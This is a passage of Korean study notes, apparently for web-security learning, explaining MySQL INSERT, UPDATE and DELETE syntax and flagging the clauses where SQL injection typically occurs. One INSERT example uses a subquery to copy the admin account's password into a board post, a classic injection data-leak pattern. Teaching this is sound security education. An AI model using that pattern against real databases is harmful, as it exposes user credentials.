        VALUES ('title 1', 'content 1'), ('title 2', 'content 2'); # board 테이블의 title, boardcontent 열에 소괄호 안의 값을 순서대로 추가함
    
    # 예시 2: 서브 쿼리를 통해 다른 테이블에 존재하는 데이터를 추가함
    INSERT
        INTO boards (title, boardcontent)
        VALUES ('title 1', (SELECT upw FROM users WHERE uid='admin'));
    ```

<br/><br/>

### UPDATE: 데이터를 수정하는 구문
* MySQL 8.0 Reference Manual의 ```UPDATE Statement``` [🔗](https://dev.mysql.com/doc/refman/8.0/en/update.html)
    ```sql
    UPDATE [LOW_PRIORITY] [IGNORE] table_reference
        SET assignment_list
        [WHERE where_condition]
        [ORDER BY ...]
        [LIMIT row_count]
    ```
    - UPDATE 구문의 간단한 형식: ```UPDATE 테이블이름 SET 속성이름1=값1[, 속성이름2=값2, ...] [WHERE <검색조건>];```
        | 절 | 설명 |
        |:---:|------|
        | UPDATE | 해당 문자열을 시작으로, 수정할 테이블을 정의함 |
        | SET | 수정할 컬럼과 데이터를 정의함 <br/> &nbsp;&nbsp; - 데이터는 SELECT문을 사용하여 다른 테이블의 속성 값을 이용할 수 있음 |
        | WHERE | 수정할 행의 조건을 명시함 |
    - ⚠️ UPDATE 구문에서는 이용자의 입력 데이터가 주로 사용되는 ```SET``` 절과 ```WHERE``` 절에서 SQL Injection이 발생할 확률이 높음

<br/>

* UPDATE 구문 사용 예시
    ```sql
    UPDATE boards # boards 테이블에서 수정할 것이라고 명시함
        SET boardcontent = "update content 2" # (수정할 컬럼) = (수정할 데이터) 형식으로 SET 절 명시
        WHERE title = 'title 1'; # 조건: title 행의 값이 'title 1'인 경우
    ```

<br/><br/>

### DELETE: 데이터를 삭제하는 구문
* MySQL 8.0 Reference Manual의 ```DELETE Statement``` [🔗](https://dev.mysql.com/doc/refman/8.0/en/delete.html)
    ```sql
    DELETE [LOW_PRIORITY] [QUICK] [IGNORE] FROM tbl_name [[AS] tbl_alias]
        [PARTITION (partition_name [, partition_name] ...)]
        [WHERE where_condition]
        [ORDER BY ...]
        [LIMIT row_count]
    ```
    - DELETE 구문의 간단한 형식: ```DELETE FROM 테이블이름 [WHERE <검색조건>];```
        | 절 | 설명 |
        |:---:|------|
        | DELETE | 해당 문자열을 시작으로, 이후에 삭제할 테이블을 정의함 |
        | FROM | 삭제할 테이블을 정의함 |
        | WHERE | (optional) 삭제할 행의 조건을 명시함 → 없으면 모든 행을 삭제함 |
    - ⚠️ DELETE 구문에서는 이용자의 입력 데이터가 주로 사용되는 ```WHERE``` 절에서 SQL Injection이 발생할 확률이 높음

<br/>

* DELETE 구문 사용 예시
    ```sql
    DELETE FROM boards # boards 테이블에서 행을 삭제함
        WHERE title = 'title 1'; # 조건: title의 값이 'title 1'인 경우
    ```

<br/><br/><br/>

## Exploit Techique
